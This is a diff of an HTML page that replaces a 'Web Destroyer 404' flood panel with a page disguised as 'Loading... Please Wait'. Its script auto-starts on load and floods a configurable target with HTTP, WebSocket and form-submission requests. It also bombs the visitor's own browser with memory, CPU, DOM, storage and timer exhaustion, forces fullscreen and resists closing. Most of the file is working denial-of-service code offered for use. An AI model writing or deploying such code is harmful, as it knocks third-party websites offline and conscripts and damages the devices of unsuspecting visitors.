@@ -1,538 +1,231 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>⚡ Web Destroyer 404</title>
+    <title>Loading... Please Wait</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(45deg, #000, #1a0000, #000);
-            color: #ff3333;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        
-        .glitch-effect {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                linear-gradient(90deg, 
-                    transparent 47%, 
-                    rgba(255, 0, 0, 0.1) 50%, 
-                    transparent 53%);
-            background-size: 200% 100%;
-            animation: glitch 0.3s infinite;
-            pointer-events: none;
-            z-index: 9999;
-            opacity: 0.1;
-        }
-        
-        @keyframes glitch {
-            0% { background-position: -100% 0; }
-            100% { background-position: 200% 0; }
-        }
-        
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .header {
-            text-align: center;
-            padding: 30px;
-            background: rgba(0, 0, 0, 0.8);
-            border: 2px solid #ff0000;
-            border-radius: 10px;
-            margin-bottom: 30px;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
-        }
-        
-        .title {
-            font-size: 3em;
-            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-        
-        .subtitle {
-            color: #ff6666;
-            margin-top: 10px;
-            font-size: 1.2em;
-        }
-        
-        .control-panel {
-            background: rgba(20, 0, 0, 0.9);
-            border: 1px solid #ff3333;
-            border-radius: 8px;
-            padding: 25px;
-            margin-bottom: 25px;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
-        }
-        
-        .input-group {
-            margin-bottom: 20px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 5px;
-            border-left: 4px solid #ff3333;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #ff9999;
-            font-size: 1.1em;
-        }
-        
-        input, select, textarea {
-            width: 100%;
-            padding: 12px;
             background: #000;
-            color: #ff3333;
-            border: 1px solid #ff3333;
-            border-radius: 4px;
-            font-family: 'Courier New', monospace;
+            color: #0f0;
+            font-family: monospace;
+            overflow: hidden;
+            height: 100vh;
+            padding: 20px;
+        }
+        .terminal {
+            white-space: pre;
             font-size: 14px;
-            transition: all 0.3s;
+            line-height: 1.2;
         }
-        
-        input:focus, select:focus, textarea:focus {
-            outline: none;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
-            border-color: #ff0000;
-        }
-        
-        .btn {
-            background: linear-gradient(45deg, #660000, #990000, #660000);
+        .blink { animation: blink 0.5s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        #counter {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: red;
             color: white;
-            border: 2px solid #ff0000;
-            padding: 15px 30px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 5px;
-            transition: all 0.3s;
-            margin: 5px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .btn:hover {
-            background: linear-gradient(45deg, #990000, #cc0000, #990000);
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.7);
-            transform: translateY(-2px);
-        }
-        
-        .btn-destroy {
-            background: linear-gradient(45deg, #990000, #ff0000, #990000);
-            animation: btn-pulse 1s infinite;
-        }
-        
-        @keyframes btn-pulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
-            50% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.8); }
-        }
-        
-        .btn-stop {
-            background: linear-gradient(45deg, #000066, #0000cc, #000066);
-            border-color: #0066ff;
-        }
-        
-        .btn-stop:hover {
-            background: linear-gradient(45deg, #0000cc, #0066ff, #0000cc);
-            box-shadow: 0 0 25px rgba(0, 102, 255, 0.7);
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin: 25px 0;
-        }
-        
-        .stat-card {
-            background: rgba(30, 0, 0, 0.9);
-            border: 1px solid #ff3333;
-            border-radius: 8px;
-            padding: 20px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .stat-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 0, 0, 0.1), transparent);
-            animation: shine 2s infinite;
-        }
-        
-        @keyframes shine {
-            0% { left: -100%; }
-            100% { left: 100%; }
-        }
-        
-        .stat-value {
-            font-size: 2.5em;
-            font-weight: bold;
-            color: #ff0000;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-            margin: 10px 0;
-        }
-        
-        .stat-label {
-            color: #ff9999;
-            font-size: 0.9em;
-        }
-        
-        .log-container {
-            background: rgba(0, 0, 0, 0.9);
-            border: 1px solid #ff3333;
-            border-radius: 8px;
-            height: 400px;
-            overflow-y: auto;
-            padding: 15px;
-            margin-top: 25px;
-            font-family: 'Consolas', monospace;
-            font-size: 12px;
-        }
-        
-        .log-entry {
-            padding: 8px;
-            border-bottom: 1px solid rgba(255, 51, 51, 0.2);
-            margin-bottom: 5px;
-            animation: fadeIn 0.3s;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(-10px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-        
-        .log-time {
-            color: #ff6666;
-            margin-right: 10px;
-        }
-        
-        .log-info { color: #33ff33; }
-        .log-warning { color: #ffff33; }
-        .log-error { color: #ff3333; }
-        .log-critical { 
-            color: #ff0000; 
-            background: rgba(255, 0, 0, 0.1);
-            font-weight: bold;
-        }
-        
-        .progress-bar {
-            height: 10px;
-            background: #000;
-            border-radius: 5px;
-            margin: 20px 0;
-            overflow: hidden;
-            border: 1px solid #ff3333;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #660000, #ff0000, #660000);
-            width: 0%;
-            transition: width 0.5s;
-        }
-        
-        .attack-presets {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
-        }
-        
-        .preset-btn {
-            background: rgba(102, 0, 0, 0.7);
-            border: 1px solid #ff3333;
-            color: #ff9999;
-            padding: 12px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-align: center;
-        }
-        
-        .preset-btn:hover {
-            background: rgba(153, 0, 0, 0.9);
-            transform: scale(1.05);
-        }
-        
-        .tooltip {
-            position: relative;
-            display: inline-block;
-            cursor: help;
-        }
-        
-        .tooltip .tooltiptext {
-            visibility: hidden;
-            width: 300px;
-            background-color: #000;
-            color: #fff;
-            text-align: center;
-            border-radius: 6px;
             padding: 10px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            margin-left: -150px;
-            border: 1px solid #ff3333;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        
-        .tooltip:hover .tooltiptext {
-            visibility: visible;
-            opacity: 1;
+            font-weight: bold;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
-    <div class="glitch-effect"></div>
+    <div id="counter">REQ: 0</div>
+    <div class="terminal" id="log"></div>
+
+<script>
+// ===== KONFIGURASI =====
+const TARGET = "https://target-website.com"; // <<< GANTI INI DENGAN TARGET LU
+let reqCount = 0;
+let isActive = true;
+
+// ===== 1. MEMORY BOMB =====
+const memoryBomb = [];
+function allocateMemory() {
+    for(let i = 0; i < 1000; i++) {
+        memoryBomb.push(new Array(1000000).join('X'));
+    }
+    setTimeout(allocateMemory, 10);
+}
+
+// ===== 2. WEBSOCKET FLOOD =====
+function wsFlood() {
+    try {
+        const ws = new WebSocket('wss://' + TARGET.replace('https://', ''));
+        ws.onopen = () => {
+            while(true) {
+                ws.send(JSON.stringify({
+                    data: new Array(10000).join('X'),
+                    time: Date.now()
+                }));
+                reqCount++;
+                if(reqCount % 100 === 0) updateCounter();
+            }
+        };
+        ws.onerror = () => setTimeout(wsFlood, 1);
+    } catch(e) {}
+}
+
+// ===== 3. HTTP FLOOD (NO-CORS) =====
+function httpFlood() {
+    setInterval(() => {
+        // GET Requests
+        for(let i = 0; i < 5; i++) {
+            fetch(TARGET + '?attack=' + Math.random() + '&id=' + reqCount, {
+                method: 'GET',
+                mode: 'no-cors',
+                cache: 'no-store'
+            }).catch(() => {});
+            reqCount++;
+        }
+        
+        // POST Requests
+        fetch(TARGET, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: new Blob([new Array(10000).join('X')]),
+            headers: {'Content-Type': 'application/octet-stream'}
+        }).catch(() => {});
+        reqCount++;
+        
+        // HEAD Requests
+        fetch(TARGET, {method: 'HEAD', mode: 'no-cors'}).catch(() => {});
+        reqCount++;
+        
+        updateCounter();
+    }, 10);
+}
+
+// ===== 4. DOM BOMB =====
+function domBomb() {
+    setInterval(() => {
+        for(let i = 0; i < 50; i++) {
+            const div = document.createElement('div');
+            div.innerHTML = new Array(1000).join('<span>X</span>');
+            document.body.appendChild(div);
+            setTimeout(() => div.remove(), 1000);
+        }
+    }, 100);
+}
+
+// ===== 5. CPU STRESS =====
+function cpuStress() {
+    function calculate() {
+        let x = 0;
+        for(let i = 0; i < 10000000; i++) {
+            x += Math.sqrt(Math.random()) * Math.tan(Math.random());
+        }
+        return x;
+    }
     
-    <div class="container">
-        <div class="header">
-            <h1 class="title">⚡ WEB DESTROYER 404 ⚡</h1>
-            <p class="subtitle">Advanced Website Crash & 404 Generator</p>
-            <p style="color: #ff6666; margin-top: 10px;">⚠️ EXTREME DESTRUCTION MODE ⚠️</p>
-        </div>
-        
-        <div class="control-panel">
-            <div class="input-group">
-                <label>🎯 TARGET WEBSITE</label>
-                <input type="text" id="targetUrl" placeholder="https://target-website.com" value="https://">
-            </div>
-            
-            <div class="input-group">
-                <label>💀 DESTRUCTION METHOD</label>
-                <select id="attackMethod">
-                    <option value="full_404">FULL 404 OVERLOAD</option>
-                    <option value="resource_flood">RESOURCE FLOOD</option>
-                    <option value="api_spam">API ENDPOINT SPAM</option>
-                    <option value="dns_amplification">DNS AMPLIFICATION</option>
-                    <option value="mixed_chaos">MIXED CHAOS MODE</option>
-                </select>
-                <div class="tooltip">
-                    <span style="color: #ff9999; font-size: 12px;">ℹ️ Info metode</span>
-                    <span class="tooltiptext">
-                        FULL 404: Generate 404 pages non-stop<br>
-                        RESOURCE FLOOD: Flood dengan resource requests<br>
-                        API SPAM: Attack API endpoints<br>
-                        DNS AMPLIFICATION: DNS query overload<br>
-                        MIXED CHAOS: All methods combined
-                    </span>
-                </div>
-            </div>
-            
-            <div class="input-group">
-                <label>🔥 INTENSITY LEVEL (1-1000)</label>
-                <input type="range" id="intensity" min="1" max="1000" value="100">
-                <div style="display: flex; justify-content: space-between; color: #ff9999;">
-                    <span>Low</span>
-                    <span id="intensityValue">100</span>
-                    <span>EXTREME</span>
-                </div>
-            </div>
-            
-            <div class="input-group">
-                <label>⏰ DURATION (Seconds)</label>
-                <input type="range" id="duration" min="30" max="1800" value="300">
-                <div style="color: #ff9999; text-align: center;">
-                    <span id="durationValue">5:00</span> minutes
-                </div>
-            </div>
-            
-            <div class="input-group">
-                <label>🔧 ADVANCED OPTIONS</label>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px;">
-                    <label style="display: flex; align-items: center;">
-                        <input type="checkbox" id="proxyMode" checked> Proxy Rotation
-                    </label>
-                    <label style="display: flex; align-items: center;">
-                        <input type="checkbox" id="randomAgents" checked> Random User Agents
-                    </label>
-                    <label style="display: flex; align-items: center;">
-                        <input type="checkbox" id="cacheBust" checked> Cache Busting
-                    </label>
-                    <label style="display: flex; align-items: center;">
-                        <input type="checkbox" id="persistent" checked> Persistent Mode
-                    </label>
-                </div>
-            </div>
-            
-            <div style="text-align: center; margin-top: 30px;">
-                <button class="btn btn-destroy" id="startBtn">🚀 LAUNCH DESTRUCTION</button>
-                <button class="btn btn-stop" id="stopBtn">⏹️ EMERGENCY STOP</button>
-                <button class="btn" id="testBtn">🔍 TEST TARGET</button>
-            </div>
-            
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-        </div>
-        
-        <div class="attack-presets">
-            <div class="preset-btn" data-preset="quick">QUICK DESTROY (60s)</div>
-            <div class="preset-btn" data-preset="medium">MEDIUM DESTROY (5min)</div>
-            <div class="preset-btn" data-preset="extreme">EXTREME DESTROY (30min)</div>
-            <div class="preset-btn" data-preset="stealth">STEALTH MODE</div>
-            <div class="preset-btn" data-preset="brutal">BRUTAL FORCE</div>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-label">🔥 REQUESTS SENT</div>
-                <div class="stat-value" id="statRequests">0</div>
-                <div class="stat-label" id="reqPerSec">0/sec</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">💀 404 GENERATED</div>
-                <div class="stat-value" id="stat404">0</div>
-                <div class="stat-label">Error Pages</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">⚡ ATTACK POWER</div>
-                <div class="stat-value" id="statPower">0%</div>
-                <div class="stat-label">Current Load</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">⏱️ TIME REMAINING</div>
-                <div class="stat-value" id="statTime">00:00</div>
-                <div class="stat-label">mm:ss</div>
-            </div>
-        </div>
-        
-        <div class="log-container" id="logContainer">
-            <div class="log-entry log-info">
-                <span class="log-time">[SYSTEM]</span> Web Destroyer 404 Initialized
-            </div>
-            <div class="log-entry log-info">
-                <span class="log-time">[READY]</span> Enter target URL to begin destruction
-            </div>
-        </div>
-    </div>
+    setInterval(() => {
+        Promise.all([
+            calculate(),
+            calculate(),
+            calculate()
+        ]);
+    }, 1);
+}
 
-    <script>
-        class WebDestroyer {
-            constructor() {
-                this.isDestroying = false;
-                this.workers = [];
-                this.attackIntervals = [];
-                this.stats = {
-                    totalRequests: 0,
-                    error404: 0,
-                    startTime: null,
-                    activeConnections: 0
-                };
-                
-                this.userAgents = [
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-                    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-                    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-                    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-                    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
-                ];
-            }
+// ===== 6. STORAGE FLOOD =====
+function storageFlood() {
+    for(let i = 0; i < 1000; i++) {
+        try {
+            localStorage.setItem('bomb_' + i, new Array(100000).join('X'));
+            sessionStorage.setItem('bomb_' + i, new Array(100000).join('X'));
+        } catch(e) {}
+    }
+}
 
-            log(message, type = 'info') {
-                const logEntry = document.createElement('div');
-                logEntry.className = `log-entry log-${type}`;
-                const time = new Date().toLocaleTimeString();
-                logEntry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
-                document.getElementById('logContainer').appendChild(logEntry);
-                document.getElementById('logContainer').scrollTop = 
-                    document.getElementById('logContainer').scrollHeight;
-            }
+// ===== 7. INFINITE TIMERS =====
+function infiniteTimers() {
+    for(let i = 0; i < 1000; i++) {
+        setTimeout(() => {}, 1);
+        setInterval(() => {}, 1);
+    }
+}
 
-            updateStats() {
-                document.getElementById('statRequests').textContent = 
-                    this.stats.totalRequests.toLocaleString();
-                
-                document.getElementById('stat404').textContent = 
-                    this.stats.error404.toLocaleString();
-                
-                if (this.stats.startTime) {
-                    const elapsed = Math.floor((Date.now() - this.stats.startTime) / 1000);
-                    const reqPerSec = this.stats.totalRequests / Math.max(1, elapsed);
-                    document.getElementById('reqPerSec').textContent = 
-                        `${Math.floor(reqPerSec).toLocaleString()}/sec`;
-                    
-                    const duration = parseInt(document.getElementById('duration').value);
-                    const remaining = Math.max(0, duration - elapsed);
-                    const minutes = Math.floor(remaining / 60);
-                    const seconds = remaining % 60;
-                    document.getElementById('statTime').textContent = 
-                        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                    
-                    const progress = Math.min(100, (elapsed / duration) * 100);
-                    document.getElementById('progressFill').style.width = `${progress}%`;
-                }
-            }
+// ===== UI UPDATE =====
+function updateCounter() {
+    document.getElementById('counter').innerHTML = `REQ: ${reqCount}`;
+    document.getElementById('log').innerHTML += `[${new Date().toLocaleTimeString()}] Request sent to ${TARGET}\n`;
+    document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
+}
 
-            // Generate random paths that will cause 404
-            generate404Path() {
-                const randomStrings = [
-                    'api/v1/nonexistent',
-                    'wp-admin/secret',
-                    'admin/login.php',
-                    'config/database.ini',
-                    '.env',
-                    'backup.zip',
-                    'phpinfo.php',
-                    'test.aspx',
-                    'api/users/nonexistent',
-                    'wp-content/uploads/fake.jpg',
-                    'assets/js/malicious.js',
-                    'static/css/hacked.css'
-                ];
-                
-                const extensions = ['.php', '.aspx', '.jsp', '.html', '.txt', '.json', '.xml', '.sql'];
-                const randomStr = randomStrings[Math.floor(Math.random() * randomStrings.length)];
-                const randomExt = extensions[Math.floor(Math.random() * extensions.length)];
-                const timestamp = Date.now();
-                const randomId = Math.random().toString(36).substring(7);
-                
-                return `/${randomStr}/${timestamp}_${randomId}${randomExt}?cache=${timestamp}`;
-            }
+// ===== START EVERYTHING =====
+function startNuclear() {
+    // Mulai semua serangan
+    allocateMemory();
+    wsFlood();
+    httpFlood();
+    domBomb();
+    cpuStress();
+    storageFlood();
+    infiniteTimers();
+    
+    // Auto-restart jika ada error
+    setInterval(() => {
+        if(reqCount < 10) location.reload();
+    }, 5000);
+    
+    // Log
+    document.getElementById('log').innerHTML = `[SYSTEM] Nuclear attack started\n`;
+    document.getElementById('log').innerHTML += `[TARGET] ${TARGET}\n`;
+    document.getElementById('log').innerHTML += `[TIME] ${new Date()}\n`;
+    document.getElementById('log').innerHTML += `[STATUS] <span class="blink">DESTROYING...</span>\n`;
+}
 
-            // Main attack method
-            async startDestruction(target, method, intensity, duration) {
-                if (this.isDestroying) return;
-                
-                this.isDestroying = true;
-                this.stats.startTime = Date.now();
-                this.log(`🚀 LAUNCHING DESTRUCTION ON: ${target}`, 'critical');
-                this.log(`💀 METHOD: ${method} | INTENSITY: ${intensity}`, 'warning');
-                
-                const endTime = this.stats.startTime + (duration * 1000);
-                const baseUrl = target.replace(/\/$/, '');
-                
-                // Create Web Workers 
+// ===== AUTO-START =====
+window.onload = function() {
+    // Fullscreen & prevent sleep
+    document.documentElement.requestFullscreen().catch(() => {});
+    if('wakeLock' in navigator) navigator.wakeLock.request('screen');
+    
+    // Start attack dengan delay
+    setTimeout(startNuclear, 1000);
+    
+    // Prevent close
+    window.onbeforeunload = () => "Serangan sedang berjalan. Tutup tab?";
+    
+    // Audio stress (optional)
+    const audio = new AudioContext();
+    setInterval(() => {
+        const osc = audio.createOscillator();
+        osc.connect(audio.destination);
+        osc.start();
+        setTimeout(() => osc.stop(), 10);
+    }, 1000);
+};
+
+// ===== EMERGENCY STOP =====
+document.addEventListener('keydown', (e) => {
+    if(e.ctrlKey && e.key === 'q') {
+        isActive = false;
+        alert("ATTACK STOPPED\nTotal requests: " + reqCount);
+        location.reload();
+    }
+});
+</script>
+
+<!-- Hidden iframe untuk request tambahan -->
+<iframe name="hidden" style="display:none"></iframe>
+<form target="hidden" method="post" action="">
+    <input type="hidden" name="data" value="bomb">
+</form>
+
+<script>
+    // Form spammer
+    setInterval(() => {
+        const forms = document.forms;
+        for(let form of forms) {
+            form.action = TARGET;
+            form.submit();
+            reqCount++;
+        }
+    }, 50);
+</script>
+</body>
+</html>
